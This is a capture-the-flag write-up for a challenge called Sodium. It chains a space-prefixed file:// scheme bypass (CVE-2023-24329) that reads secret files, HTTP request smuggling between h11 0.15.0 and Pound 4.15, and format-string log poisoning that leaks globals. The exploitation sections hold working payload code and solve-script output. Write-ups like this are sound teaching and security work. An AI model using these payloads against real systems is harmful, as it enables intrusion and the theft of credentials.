Sodium
============

Sodium has multiple vulnerabilities that need to be exploited to get the flag. 

- A vulnerability in Python’s `urllib` (CVE-2023-24329) allows bypassing URL scheme checks using a space-prefixed ` file://` scheme. This enables access to environment variables, leaking the RPC service’s `AUTHENTICATION_KEY`.
- A parsing discrepancy between the `h11` HTTP library and the Pound reverse proxy (version 4.15) allows HTTP request smuggling. By crafting a malformed chunked request, the attacker can bypass an internal `X-Forwarded-For` check and add their IP to the backend's allowlist.
- The backend shows stats for the server through the `/stats` endpoint. The way the message is formed leads to a vulnerability if an attacker poisons the logs with a format string exploit which is then added to the template and after a second format functions is processed we can leak the flag via the globals.

---

## Discovery

We begin by examining the Dockerfile, which uses the following base image:

```dockerfile
FROM python:3.11.3-bullseye
```

Navigating to the main site reveals a static Nginx page for Sodium Inc. However, the pound.cfg configuration defines virtual hosts that route based on the Host header:

```conf
Service "RPC Service"
    Host "dev.rpc-service.ductf"
    BackEnd
        Address 127.0.0.1
        Port    8081
    End
End

Service "Domain Scanner"
    Host "dev.customer.ductf"
    BackEnd
        Address 127.0.0.1
        Port    5000
    End
End

Service "Public Website"
    Host -re ".*"
    BackEnd
        Address 127.0.0.1
        Port    8080
    End
End
```

You can access the internal apps by setting the Host header to either `dev.rpc-service.ductf` or `dev.customer.ductf`.

**`dev.customer.ductf`**

The “Check your enrollment” page allows users to input a domain URL, which is fetched and parsed for a `<title>` tag:

```python
if not is_safe_url(url):
    return render_template("result.html", domain=url, result="Blocked by blacklist.")
preview = urlopen(url).read().decode('utf-8', errors='ignore')
company_name = re.search(r'<title>(.*)</title>', preview).group(1)
```

Before fetching the URL, it runs through a basic scheme blacklist:

```python
BLACKLIST = ['file', 'gopher', 'dict']

def is_safe_url(url):
    scheme = urlparse(url).scheme
    return scheme not in BLACKLIST
```

This check is vulnerable to `CVE-2023-24329`, where prefixing a URL with a space bypasses urlparse's scheme detection. Using:

```
 file:///proc/self/cwd/.env
```

...lets us access the .env file, which contains the AUTHENTICATION_KEY. This value is loaded in run.py:

```python
dotenv.load_env("./.env")
```

The key can also be accessed from `/proc/self/environ`.

**`dev.rpc-service.ductf`**

Accessing this domain returns a generic “Invalid request” message. Looking into the Dockerfile, we find:

```dockerfile
pip3 install h11==0.15.0
RUN wget https://github.com/graygnuorg/pound/releases/download/v4.15/pound-4.15.tar.gz 
```

This combination of `h11` and Pound introduces a request smuggling vulnerability:
- Pound 4.15 mishandles oversized chunked requests and passes them to the backend [PR #43](https://github.com/graygnuorg/pound/pull/43).
- h11 < 0.16.0 (specifically 0.15.0 here) accepts any two trailing bytes at the end of a chunk, instead of requiring `\r\n` [GHSA advisory](https://github.com/python-hyper/h11/security/advisories/GHSA-vqfr-h8mv-ghfj).

Despite confusing wording in the advisory, version 0.15.0 is still vulnerable. This discrepancy between the proxy and server parsers allows smuggling a second request past the proxy’s header restrictions.

**`Format String Injection`**

Lastly, the backend seems to be reading in the log files, and then adding in the config object to the **entire** template until that point, which will include any data we send and gets populated into the log file:

```python
    # Print logs
    if get_log == True:
        template = """
            <h1>Admin Stats Page</h1>
                {logs}
            """.format(logs=get_logs())
    <snip>
    if get_config == True:
        template += """
                    <h2>Current Configuration</h2>
                    {config}
                    """
    <snip>    
    return template.format(config=config)
```

Now we need to somehow get our payload into the error log, and looking at the code shows there is one spot where we can reliably delivery our payload:

```python
# /stats endpoint
if target.startswith("/stats"):
    try:
        params = {}
        for param in re.search(r".*\?(.*)", target).groups()[0].split("&"):
            # We can cause an error here by providing ?payload since its looking for the index 1 which won't exist 
            params[param.split("=")[0]] = bool(param.split("=")[1])
        body = build_stats_page(**params).encode()
    except Exception as e:
        logger.error(f"[!] Error while fetching stats. Request made to: {target} with error: {e}")
        send_response(conn, conn_state, 500, "Internal Server Error")
        return
    send_response(conn, conn_state, 200, body)
    return
```

We can exploit the above by send a get request with just a param name with no value, and since its looking for that value in the list by the index number, we should get an "index out of range" error. By abusing this we can poison the logs with your payload which will be interpreted when we enable the logs.

---
## Exploitation

### Step 1: Leak the Key

Access the internal `.env` file by bypassing the scheme check with a space:

```
 file:///proc/self/cwd/.env or file:///proc/self/environ
```

This reveals the `AUTHENTICATION_KEY`.

### Step 2: Smuggle a Request

Here’s a example of the smuggling payload:

```python
smuggled = (
    "GET /update_allowlist?ip=172.18.0.1 HTTP/1.1\r\n"
    "Host: dev.rpc-service.ductf\r\n"
    f"Auth-Key: CTFSECRET123\r\n"
    "Action: {flag}\r\n"
    "X-Forwarded-For: 127.0.0.1\r\n"
    "Transfer-Encoding: chunked\r\n"
    "\r\n"
    "0\r\n"
    "\r\n"
)

payload = (
    "GET /ping HTTP/1.1\r\n"
    "Host: dev.rpc-service.ductf\r\n"
    "Connection: keep-alive\r\n"
    "Transfer-Encoding: chunked\r\n"
    "\r\n"
    "5\r\n"
    "AAAAAXX2\r\n"
    f"{len(smuggled) + 5:X}\r\n"
    "0\r\n"
    "\r\n"
    f"{smuggled}"
)
```
- The keep-alive header keeps the connection open.
- The chunk AAAAAXX2 misuses h11's lenient parser to bypass proper chunk termination.
- A second request is smuggled in as a large chunk, which h11 reads while the proxy (Pound) considers the request complete.

### Step 3: Poison the Error Log

Once your IP is allowlisted, send a request like this:

```python
req = Request("http://dev.rpc-service.ductf/stats?{config.__init__.__globals__[FLAG]}")
req.add_header("auth-key", authentication_key)
try:
    res = urlopen(req).read()
except:
    print("[+] Caused an error successfully")
```

This payload abuses the fact that the server used `load_dotenv` to load the environment variables which will be easy to fetch since they are populated in the `globals`. Initially the idea for this challenge did not have this in the globals, but instead required reading the env variables through `os.environ`. However, due to some weird issues this was changed to have the flag in the globals.

### Step 4: Read the flag

We can now read the flag with the following request once our format string vulnerability is triggered:

```python
res = requests.get("http://dev.rpc-service.ductf/stats?get_log=true", headers = {"Auth-key": authentication_key})
flag = re.search(r'(DUCTF\{.*?\})', res.text).group(0)
if flag:
    print(f"[+] Flag: {flag}")
```

For this to work on the server, we need to first determine what X-Forwarded-For IP is being sent to the server, which is reflected in the output. That can then be used for whitelisting and then the flag can be easily retrieved.

## Script

The solve script will perform all of the exploits if the hosts are in your /etc/hosts file:

```bash
python3 solve.py
[*] Registering new user...
[+] Registration successful
[*] Logging in...
[+] Login successful
[*] Leaking internal API key via /proc/self/environ...
[+] Leaked internal API key: 2e48228116c6ae588ba6155859f0f2cf67e81f01
[*] Sending smuggled request...
[*] Payload length: 316 bytes
[*] Awaiting response...
[+] No response received from the server. Payload likely successfully smuggled for whitelisting: 10.104.0.61
[*] Sending smuggled request...
[*] Payload length: 316 bytes
[*] Awaiting response...
[+] No response received from the server. Payload likely successfully smuggled for whitelisting: 10.104.1.20
[*] Sending smuggled request...
[*] Payload length: 317 bytes
[*] Awaiting response...
[+] No response received from the server. Payload likely successfully smuggled for whitelisting: 10.104.2.105
[*] Fetching flag...
[+] Caused an error successfully
[+] Flag: DUCTF{th3y_s33_m3_smuggl1ng_4nd_ch41n1ng}
```
